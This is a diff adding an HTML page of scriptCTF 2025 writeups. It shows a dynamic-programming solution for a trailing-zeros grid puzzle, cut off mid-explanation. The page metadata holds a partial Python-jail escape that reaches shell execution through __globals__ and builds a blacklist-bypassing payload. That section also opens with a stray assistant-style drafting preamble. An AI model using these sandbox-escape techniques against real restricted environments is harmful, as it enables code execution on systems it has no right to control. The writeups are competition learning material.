@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>scriptCTF 2025 | Portfolio</title>
+<meta name="keywords" content="scriptctf, ctf, web, programming, pyjail, osint">
+<meta name="description" content="All the writeups of the scriptCTF 2025">
+<meta name="author" content="Ale18V, AlBovo, katchup">
+<link rel="canonical" href="https://albovo.github.io/en/ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://albovo.github.io/en/ctf/scriptctf2025/">
+<link rel="alternate" hreflang="it" href="https://albovo.github.io/it/ctf/scriptctf2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css" integrity="sha384-5TcZemv2l/9On385z///+d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.js" integrity="sha384-cMkvdD8LoxVzGF/RPUKAcvmm49FQ0oxwDF3BGKtDXcEc+T1b2N+teh/OJfpU0jr6" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/contrib/auto-render.min.js" integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          delimiters: [
+              {left: '$$', right: '$$', display: true},
+              {left: '$', right: '$', display: false},
+              {left: '\\(', right: '\\)', display: false},
+              {left: '\\[', right: '\\]', display: true}
+          ],
+          throwOnError : false
+        });
+    });
+</script>
+
+<meta property="og:url" content="https://albovo.github.io/en/ctf/scriptctf2025/">
+  <meta property="og:site_name" content="Portfolio">
+  <meta property="og:title" content="scriptCTF 2025">
+  <meta property="og:description" content="All the writeups of the scriptCTF 2025">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctf">
+    <meta property="article:published_time" content="2025-08-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-08-22T00:00:00+00:00">
+    <meta property="article:tag" content="Scriptctf">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Programming">
+    <meta property="article:tag" content="Pyjail">
+    <meta property="article:tag" content="Osint">
+    <meta property="og:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
+<meta name="twitter:title" content="scriptCTF 2025">
+<meta name="twitter:description" content="All the writeups of the scriptCTF 2025">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Capture The Flag 🚩",
+      "item": "https://albovo.github.io/en/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "scriptCTF 2025",
+      "item": "https://albovo.github.io/en/ctf/scriptctf2025/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "scriptCTF 2025",
+  "name": "scriptCTF 2025",
+  "description": "All the writeups of the scriptCTF 2025",
+  "keywords": [
+    "scriptctf", "ctf", "web", "programming", "pyjail", "osint"
+  ],
+  "articleBody": "scriptCTF 2025 🚩 Back From Where 💻 Problem Statement The problem can be stated as follows:\nYou are given an \\(N \\times N\\) grid of integers \\(a_{ij}\\). A path is considered valid if it starts top-left and only moves down or right. For each cell \\((i,j)\\) find the maximum number of trailing zeros in the product of values along any valid path.\nWriteup 📜 Number of trailing zero’s The first question is how to practically calculate the number of trailing zero’s of a number $m$. The answer is pretty straightforward: we find how many times $m$ is divisible by $5$ and by $2$ the number of trailing zero’s is how many five’s and two’s can be matched together. Suppose $m$ is divisible by five $f$ times and by two $t$ times, then the number of trailing zero’s is \\(min(f, t)\\).\nFirst attempt My guess for solving this problem was using a dynamic programming approach.\nThe first idea that came to mind was to store for every cell a pair where f is the number of fives accumulated until that cell and t is the number of twos. At every cell we would just explore the neighbors and check which choice provides the biggest number of trailing zero’s. The idea was clearly nonsensical as we can’t maximize for both at the same time. But this led me to an important insight.\nA better idea What if I instead fix one of the two and maximize for the other one? This is indeed possible.\nLet dp[i][j][f] be the maximum number of two’s we can accumulate on any path from the top-left cell to cell $(i,j)$ with at least $f$ fives.\nLet the value $a_{ij}$ of cell $(i, j)$ contain $5^{F}$ and $2^{T}$ in its prime factorization.\nThen:\ndp[i][j][f] = max(dp[i-1][j][max(f - F, 0)], dp[i][j-1][max(f - F, 0)]) + T This generally works but we have to handle the first column and first row differently to avoid indexes out of bounds so:\ndp[0][j][f] = dp[0][j-1][max(f-F, 0)] + T (with j \u003e 0) dp[i][0][f] = dp[i-1][0][max(f-F, 0)] + T (with i \u003e 0) And the initalization of the cell $(0, 0)$ is performed as follows:\n// number of [fives, twos] in the prime factorization of cell (0,0) auto [c, d] = divs[g[0][0]]; for (int q = 0; q \u003c= c; q++) // it's possible to get here with `q` fives dp[q][0][0] = d; The solution for cell $(i, j)$ can be computed while calculating dp:\nfor(int q = 0; q \u003c B; q++) { ... n_trailing_zeroes = min(q, dp[q][i][j]); ans[i][j] = max(ans[i][j], n_trailing_zeroes); ... } Solution correctness How are we taking into account the possibility that no path exists such that we get to cell $(i, j)$ with $f$ fives? The dp array is initialized to negative infinity. When we run our dynamic programming on the array only paths with a legal number of fives will propagate.\nAs a concrete example, suppose $a_{00} = 5$ and $a_{01} = 4$. Then according to the above initialization:\ndp[0][0][0] = 1 dp[0][0][1] = 1 The rest will be:\ndp[0][0][2] = -INF ... = -INF So if we explore cell $(0, 1)$ assuming f = 2 then:\ndp[0][1][0] = dp[0][0][max(2-0, 0)] + 2 = dp[0][0][2] + 2 = -INF + 2 = -INF Time complexity Finally, is the time complexity of the algorithm feasible? Let’s call $B$ the bound on the number of fives on any given path. We know that it makes no sense to calculate dp[i][j][f] with f \u003e B because no path can have more than $B$ fives. The complexity of the algorithm would be $O(B\\times N^{2})$. Let $A$ be the bound on the values contained in the cells, then it follows that no cell value $a_{ij}$ can contain more than $log_{5}(A)$ fives in its prime factorization. The longest valid path on the grid is of length $2N$ thus the bound on the total number of fives in the prime factorization of the product of any path is $2N\\log{5}A$. If we take a look at the server code that generates the grid:\nn = 100 grid_lines = [] for _ in range(n): row = [] for _ in range(n): flip = random.randint(1, 2) if flip == 1: row.append(str(random.randint(1, 696) * 2)) else: row.append(str(random.randint(1, 696) * 5)) grid_lines.append(' '.join(row)) We see that A = max(696 * 2, 696 * 5) = 3480 which we round up to 5000. Given that $\\log_{5}(5000) = \\log_{5}(A) \\approx 5.3$, no more than $5$ fives per cell can be added. The complexity is then $O(2N^{3}\\log_{5}(A))$. Plugging in the constraints regarding $A$ and $N$ this practically means about $100^3 * 10 = 10^7$ operations which is fast.\nFull solution #include using namespace std; constexpr int N = 100; constexpr int MAXV = 5000; constexpr int B = 10*N; #define INF (1e9) constexpr array\u003cpair\u003cint, int\u003e, MAXV\u003e divs = []() consteval { array\u003cpair\u003cint, int\u003e, MAXV\u003e res; for (int i = 1; i \u003c MAXV; i++) { res[i] = {0, 0}; int j = i; while (j % 2 == 0) { res[i].second++; j = j \u003e\u003e 1; } while (j % 5 == 0) { res[i].first++; j = j/5; } } return res; }(); int main() { vector\u003cvector\u003cint\u003e\u003e g(N, vector\u003cint\u003e(N, 0)); for (auto \u0026row : g) { for (auto \u0026e : row) { cin \u003e\u003e e; } } vector\u003cvector\u003cint\u003e\u003e ans(N, vector\u003cint\u003e(N, 0)); vector\u003cvector\u003cvector\u003cint\u003e\u003e\u003e dp(B, vector\u003cvector\u003cint\u003e\u003e(N, vector\u003cint\u003e(N, -INF))); auto [c, d] = divs[g[0][0]]; ans[0][0] = min(c, d); for (int q = 0; q \u003c= c; q++) { dp[q][0][0] = d; } for (int q = 0; q \u003c B; q++) { for (int i = 1; i \u003c N; i++) { auto [c, d] = divs[g[i][0]]; dp[q][i][0] = dp[max(q - c, 0)][i - 1][0] + d; ans[i][0] = max(ans[i][0], min(q, dp[q][i][0])); } for (int j = 1; j \u003c N; j++) { auto [c, d] = divs[g[0][j]]; dp[q][0][j] = dp[max(q - c, 0)][0][j - 1] + d; ans[0][j] = max(ans[0][j], min(q, dp[q][0][j])); } for (int i = 1; i \u003c N; i++) { for (int j = 1; j \u003c N; j++) { auto [c, d] = divs[g[i][j]]; dp[q][i][j] = max(dp[max(q - c, 0)][i - 1][j], dp[max(q - c, 0)][i][j - 1]) + d; ans[i][j] = max(ans[i][j], min(q, dp[q][i][j])); } } } for (auto \u0026row : ans) { for (auto \u0026v : row) { cout \u003c\u003c v \u003c\u003c \" \"; } cout \u003c\u003c endl; } } Modulo 🐍 Here’s a polished write-up draft you can adapt for your team’s blog or the CTF submission. I kept it engaging but technical, and highlighted the progression of reasoning (including the “false trails” we went through) because that’s often what organizers appreciate most.\nChallenge Recap We were given the following Python jail:\nimport ast print(\"Welcome to the jail! You're never gonna escape!\") payload = input(\"Enter payload: \") # No uppercase needed blacklist = list(\"abdefghijklmnopqrstuvwxyz1234567890\\\\;._\") for i in payload: assert ord(i) \u003e= 32 assert ord(i) \u003c= 127 assert (payload.count('\u003e') + payload.count('\u003c')) \u003c= 1 assert payload.count('=') \u003c= 1 assert i not in blacklist tree = ast.parse(payload) for node in ast.walk(tree): if isinstance(node, ast.BinOp): if not isinstance(node.op, ast.Mod): raise ValueError(\"I don't like math :(\") exec(payload,{'__builtins__':{},'c':getattr}) print('Bye!') Restrictions:\nAll lowercase letters are blacklisted except c. No digits, no underscores, no dots, no backslashes. At most one \u003c and one = in the entire payload. The only allowed binary operator is %. Execution context has no builtins, only c = getattr. First impression The first thing that I immediately noticed was that there was no hint of any flag in the challenge code. The goal was clearly to get a RCE.\nThe usual procedure to deal with pyjails is the following:\nUse object.__subclasses__() to get a hold of dangerous classes. Find one whose __init__.__globals__ contained __builtins__. From there, call __import__('os').system('cat flag'). The . character was blacklisted but we had access to getattribute using the c character. The real problems were that the underscore character was blacklisted and the builtins were empty.\nAnother key variable There is another important variable similar to the builtins which is __globals__.\n__globals__ is attached to every Python function object and is the actual dictionary used as the global namespace when the function runs.\nAccessing it bypasses the fact that exec was given __builtins__ = {}. We don’t care about that anymore if we can find a function from a module whose globals already contain powerful references.\nEnter the hero: importlib._bootstrap.ModuleSpec.\nIts __globals__ include sys, and from that, one can reach sys.modules['posix'] and its system function to execute shell commands.\nThis avoids touching builtins entirely\nBypass the filters Forge integers without digits: We can get False with the expression [] \u003c []. Since we are allowed to use one = character we can assign that to a variable: X := []\u003c[].\nRemember that only binary operators are blocked but we can get any number from X using only unary operators:\nWe can flip sign of any number and decrease by one using the ~ operator (eg ~0 = -1) Flip sign using the - operator. Even if X is actually False and not 0, the value is interpreted as integer using those operators. For example to get 3 we can use -~(-~(-~X)). This is the primitive that we defined to generate numbers:\ndef define_zero() -\u003e str: # exactly one '=' and one '\u003c' in the whole payload return \"(X:=[]\u003c[])\" @lru_cache(maxsize=None) def n_expr(n: int) -\u003e str: \"\"\" Build an integer expression using only: - X (assumed 0) - unary operators ~ and -~ No digits in source. \"\"\" if n == 0: return \"X\" if n == -1: return \"~X\" return \"(\" + \"-~\" * n + \"X\" + \")\" Conjure strings without letters: It is not very known but the % binary operator can be used to format strings if applied on a string, similar to how the C function printf works. The %c format specifier is notable because it formats a character from a codepoint, aka ascii encoding for the sake of this writeup. For example, the underscore’s codepoint is 95, thus \"%c\" % 95 = \"_\". So right now we can craft any number and any string.\nThis is the primitive that we used for crafting arbitrary strings:\ndef str_expr(s: str) -\u003e str: \"\"\" Build a string literal via \"%c\"*k % (codepoints...), where each codepoint is built via n_expr. Only % as BinOp; no forbidden letters in source. \"\"\" parts = [n_expr(ord(ch)) for ch in s] return '\"' + (\"%c\" * len(parts)) + '\"%(' + \",\".join(parts) + \")\" Exploit The exploit consists of two parts:\nAccessing ModuleSpec (Probe) RCE (Exec) Probing All classes in Python are subclasses of object and every class has an attribute called __subclasses__. So we can get to ModuleSpec from there. The question is how to get to object.\nHere __mro__ comes into play. Every class in Python has a __mro__ attribute, the method resolution order. It is a tuple of classes Python will search when looking up attributes. For example, using c aka getattr:\n\u003e\u003e\u003e getattr.__class__ \u003cclass 'builtin_function_or_method'\u003e \u003e\u003e\u003e getattr.__class__.__mro__ (\u003cclass 'builtin_function_or_method'\u003e, ",
+  "wordCount" : "2974",
+  "inLanguage": "en",
+  "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups","datePublished": "2025-08-22T00:00:00Z",
+  "dateModified": "2025-08-22T00:00:00Z",
+  "author":[{
+    "@type": "Person",
+    "name": "Ale18V"
+  }, {
+    "@type": "Person",
+    "name": "AlBovo"
+  }, {
+    "@type": "Person",
+    "name": "katchup"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://albovo.github.io/en/ctf/scriptctf2025/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Portfolio",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://albovo.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://albovo.github.io/en/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://albovo.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://albovo.github.io/it/" title="Italian"
+                            aria-label=":it: It">🇮🇹 It</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://albovo.github.io/en/projects/" title="📒 Projects">
+                    <span>📒 Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://albovo.github.io/en/ctf/" title="⚙ Writeups">
+                    <span>⚙ Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://albovo.github.io/en/aoc/" title="🎄 Advent of Code">
+                    <span>🎄 Advent of Code</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://albovo.github.io/en/competitions/" title="🏆 Competitions">
+                    <span>🏆 Competitions</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://albovo.github.io/en/">Home</a>&nbsp;»&nbsp;<a href="https://albovo.github.io/en/ctf/">Capture The Flag 🚩</a></div>
+    <h1 class="post-title entry-hint-parent">
+      scriptCTF 2025
+    </h1>
+    <div class="post-description">
+      All the writeups of the scriptCTF 2025
+    </div>
+    <div class="post-meta"><span title='2025-08-22 00:00:00 +0000 UTC'>August 22, 2025</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;2974 words&nbsp;·&nbsp;Ale18V, AlBovo, katchup&nbsp;|&nbsp;Translations:
+<ul class="i18n_list">
+    <li>
+        <a href="https://albovo.github.io/it/ctf/scriptctf2025/">🇮🇹 It</a>
+    </li>
+</ul>&nbsp;|&nbsp;<a href="https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en/ctf/scriptctf2025.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#back-from-where-">Back From Where 💻</a>
+      <ul>
+        <li><a href="#problem-statement">Problem Statement</a></li>
+        <li><a href="#writeup-">Writeup 📜</a></li>
+        <li><a href="#full-solution">Full solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#modulo-">Modulo 🐍</a>
+      <ul>
+        <li><a href="#challenge-recap">Challenge Recap</a></li>
+        <li><a href="#first-impression">First impression</a></li>
+        <li><a href="#another-key-variable">Another key variable</a></li>
+        <li><a href="#bypass-the-filters">Bypass the filters</a></li>
+        <li><a href="#exploit">Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#wizard-gallery-">Wizard Gallery 🌐</a>
+      <ul>
+        <li><a href="#exploit-path">Exploit path</a></li>
+        <li><a href="#one-liner-test">One-liner test</a></li>
+        <li><a href="#automation">Automation</a></li>
+        <li><a href="#exploit-1">Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#insider-4-">Insider 4 🔎</a>
+      <ul>
+        <li><a href="#introduction">Introduction</a></li>
+        <li><a href="#analysis">Analysis</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="scriptctf-2025-">scriptCTF 2025 🚩<a hidden class="anchor" aria-hidden="true" href="#scriptctf-2025-">#</a></h1>
+<p><img alt="scriptctf logo" loading="lazy" src="/images/scriptctf.png"></p>
+<h2 id="back-from-where-">Back From Where 💻<a hidden class="anchor" aria-hidden="true" href="#back-from-where-">#</a></h2>
+<h3 id="problem-statement">Problem Statement<a hidden class="anchor" aria-hidden="true" href="#problem-statement">#</a></h3>
+<p>The problem can be stated as follows:</p>
+<p><em>You are given an \(N \times N\) grid of integers \(a_{ij}\). A path is considered valid if it starts top-left and only moves down or right. For each cell \((i,j)\) find the maximum number of trailing zeros in the product of values along any valid path.</em></p>
+<h3 id="writeup-">Writeup 📜<a hidden class="anchor" aria-hidden="true" href="#writeup-">#</a></h3>
+<h4 id="number-of-trailing-zeros">Number of trailing zero&rsquo;s<a hidden class="anchor" aria-hidden="true" href="#number-of-trailing-zeros">#</a></h4>
+<p>The first question is how to practically calculate the number of trailing zero&rsquo;s of a number $m$. The answer is pretty straightforward: we find how many times $m$ is divisible by $5$ and by $2$ the number of trailing zero&rsquo;s is how many five&rsquo;s and two&rsquo;s can be matched together. Suppose $m$ is divisible by five $f$ times and by two $t$ times, then the number of trailing zero&rsquo;s is \(min(f, t)\).</p>
+<h4 id="first-attempt">First attempt<a hidden class="anchor" aria-hidden="true" href="#first-attempt">#</a></h4>
+<p>My guess for solving this problem was using a <em>dynamic programming</em> approach.</p>
+<p>The first idea that came to mind was to store for every cell a pair <code>&lt;f, t&gt;</code> where <code>f</code> is the number of <strong>f</strong>ives accumulated until that cell and <code>t</code> is the number of <strong>t</strong>wos. At every cell we would just explore the neighbors and check which choice provides the biggest number of trailing zero&rsquo;s. The idea was clearly nonsensical as we can&rsquo;t maximize for both at the same time. But this led me to an important insight.</p>
+<h4 id="a-better-idea">A better idea<a hidden class="anchor" aria-hidden="true" href="#a-better-idea">#</a></h4>
+<p><em>What if I instead fix one of the two and maximize for the other one</em>? This is indeed possible.</p>
+<p>Let <code>dp[i][j][f]</code> be the maximum number of two&rsquo;s we can accumulate on any path from the top-left cell to cell $(i,j)$ with at least $f$ fives.</p>
+<p>Let the value $a_{ij}$ of cell $(i, j)$ contain $5^{F}$ and $2^{T}$ in its prime factorization.</p>
+<p>Then:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">f</span><span class="p">]</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">max</span><span class="p">(</span><span class="n">f</span> <span class="o">-</span> <span class="n">F</span><span class="p">,</span> <span class="mi">0</span><span class="p">)],</span> <span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">max</span><span class="p">(</span><span class="n">f</span> <span class="o">-</span> <span class="n">F</span><span class="p">,</span> <span class="mi">0</span><span class="p">)])</span> <span class="o">+</span> <span class="n">T</span>
+</span></span></code></pre></div><p>This generally works but we have to handle the first column and first row differently to avoid indexes out of bounds so:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">f</span><span class="p">]</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">max</span><span class="p">(</span><span class="n">f</span><span class="o">-</span><span class="n">F</span><span class="p">,</span> <span class="mi">0</span><span class="p">)]</span> <span class="o">+</span> <span class="n">T</span> <span class="p">(</span><span class="n">with</span> <span class="n">j</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="n">f</span><span class="p">]</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="n">max</span><span class="p">(</span><span class="n">f</span><span class="o">-</span><span class="n">F</span><span class="p">,</span> <span class="mi">0</span><span class="p">)]</span> <span class="o">+</span> <span class="n">T</span> <span class="p">(</span><span class="n">with</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></div><p>And the initalization of the cell $(0, 0)$ is performed as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="c1">// number of [fives, twos] in the prime factorization of cell (0,0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">auto</span> <span class="p">[</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">]</span> <span class="o">=</span> <span class="n">divs</span><span class="p">[</span><span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">q</span> <span class="o">&lt;=</span> <span class="n">c</span><span class="p">;</span> <span class="n">q</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	 <span class="c1">// it&#39;s possible to get here with `q` fives
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	 <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
+</span></span></code></pre></div><p>The solution for cell $(i, j)$ can be computed while calculating <code>dp</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">q</span> <span class="o">&lt;</span> <span class="n">B</span><span class="p">;</span> <span class="n">q</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="n">n_trailing_zeroes</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">],</span> <span class="n">n_trailing_zeroes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="solution-correctness">Solution correctness<a hidden class="anchor" aria-hidden="true" href="#solution-correctness">#</a></h4>
+<p>How are we taking into account the possibility that no path exists such that we get to cell $(i, j)$ with $f$ fives? The <code>dp</code> array is initialized to negative infinity. When we run our dynamic programming on the array only paths with a legal number of fives will propagate.</p>
+<p>As a concrete example, suppose $a_{00} = 5$ and $a_{01} = 4$. Then according to the above initialization:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span></code></pre></div><p>The rest will be:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="n">INF</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span> <span class="o">=</span> <span class="o">-</span><span class="n">INF</span>
+</span></span></code></pre></div><p>So if we explore cell $(0, 1)$ assuming <code>f = 2</code> then:</p>
